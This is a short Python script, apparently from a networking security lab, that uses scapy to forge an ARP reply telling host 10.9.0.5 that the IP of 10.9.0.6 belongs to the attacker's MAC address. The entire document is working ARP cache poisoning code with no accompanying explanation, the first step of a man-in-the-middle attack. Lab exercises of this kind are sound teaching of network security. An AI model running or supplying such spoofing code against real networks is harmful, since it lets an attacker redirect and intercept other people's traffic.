#!/user/bin/env python3
from scapy.all import *

A_ip = "10.9.0.5"
A_mac = "02:42:0a:09:00:05"
B_ip = "10.9.0.6"
B_mac = "02:42:0a:09:00:06"
M_ip = "10.9.0.105"
M_mac = "02:42:0a:09:00:69"

eth=Ether(src=M_mac,dst=A_mac)
arp=ARP(hwsrc=M_mac,hwdst=A_mac,psrc=B_ip,pdst=A_ip)
arp.op=2
pkt=eth/arp
sendp(pkt)
